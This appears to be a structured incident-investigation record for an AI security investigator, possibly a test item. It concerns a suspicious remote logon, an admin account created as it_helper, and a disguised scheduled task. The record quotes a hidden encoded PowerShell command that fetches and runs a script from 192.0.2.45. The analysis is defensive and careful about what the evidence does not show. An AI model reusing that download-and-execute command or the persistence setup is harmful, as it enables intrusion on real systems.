system: You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.

supporting_observations.claim: At 13:40:22 UTC, WS-BCARTER-01 recorded a Kerberos remote-interactive logon (LogonType 10) for omar.haddad from 192.0.2.45; the session received special privileges. The inventory says remote administration is only performed from WS-OHADDAD-01 and there is no VPN.
At 13:44:18 UTC, the domain controller recorded creation of it_helper by omar.haddad; two seconds later, it_helper was added to the Administrators group.

At 13:44:22 UTC, a task named Microsoft\Windows\HealthCheck was created on WS-BCARTER-01 under omar.haddad's remote-session logon ID. Its action launches PowerShell hidden with an encoded command that decodes to IEX (iwr http://192.0.2.45/a.ps1).

The combination of the remote logon inconsistent with the stated administration practice, creation of an administrator account, and a task configured to retrieve and execute a script from 192.0.2.45 supports a malicious-activity finding.

On WS-BCARTER-01, the Commvault GxCVD.exe service process attempted explicit authentication to FILE-HD-01 using svc-claimsync. The inventory describes svc-claimsync as a ClaimSync job account on FILE-HD-01, not as a Commvault service on this workstation.

known_telemetry_limitations: Proxy logging for 2026-10-20 13:30–14:10 UTC was not collected because of a log-collection outage; this overlaps the remote logon, account creation, and scheduled-task activity.
The available Zeek connection records show connections to the proxy but do not provide the corresponding requested URLs or content.
claims_not_established: The available records do not establish who controlled or used source address 192.0.2.45.
The account-creation event uses logon ID 0x38377da, while the recorded remote session on WS-BCARTER-01 uses 0x88a28e8; the available evidence does not directly link those logon IDs.
The evidence does not show whether the scheduled task executed successfully, what the referenced script contained, or whether it caused further activity.
The evidence does not establish whether the svc-claimsync credential use by GxCVD.exe was part of the same activity or an independent event.
additional_evidence_needed: Preserve and investigate WS-BCARTER-01, including the scheduled task, PowerShell operational/script-block logs, process and file artifacts, and any retrieved script or payload.
Identify the owner and route of 192.0.2.45 and collect relevant authentication, firewall, and remote-access evidence for the 13:40 UTC connection.
Correlate the domain-controller account-management logon ID 0x38377da with authentication and session records to determine how the account was created.
Recover proxy logs for the outage window, if available, and determine the task's outbound destination and any associated transfers.
Review FILE-HD-01 and the ClaimSync/Commvault configuration and logs to explain the svc-claimsync authentication from WS-BCARTER-01.
